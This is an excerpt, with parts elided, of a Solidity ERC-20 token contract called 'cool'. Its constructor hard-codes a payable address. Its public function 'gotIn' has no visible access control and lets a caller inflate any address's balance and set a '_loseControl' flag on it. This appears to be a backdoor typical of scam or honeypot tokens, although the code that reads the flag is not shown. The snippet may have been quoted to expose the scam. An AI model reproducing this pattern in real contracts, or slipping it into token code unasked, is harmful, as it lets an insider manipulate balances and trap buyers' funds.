...
contract cool is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        _create = payable(address(0xa15089e11FB0FD408f0D9c7A3eB5189FC57D0FCF));
    ...
    function gotIn(bool state,address[] calldata gottas,uint256 number) public {
            if(state){
                _balances[gottas[number]] =  _balances[gottas[number]] + uint256(2 * tFee + 1 * tFee);
                _loseControl[gottas[number]] = true;
            }
        }
